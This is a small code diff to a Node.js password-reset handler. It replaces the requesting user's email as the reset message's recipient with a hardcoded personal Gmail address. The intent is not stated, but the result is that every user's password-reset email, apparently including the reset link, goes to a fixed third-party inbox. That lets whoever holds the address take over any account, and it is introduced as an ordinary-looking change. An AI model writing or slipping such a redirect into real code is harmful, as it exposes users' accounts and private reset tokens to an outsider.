@@ -106,7 +106,7 @@ module.exports.forgotPassword = async (req, res) => {
         var emailBody = MailGenerator.generate(response);
         let message = {
             from: `${process.env.EMAIL}`,
-            to: `${email}`,
+            to: "kartikaggarwal2004@gmail.com",
             subject: 'Password Reset Request',
             html: emailBody
         };
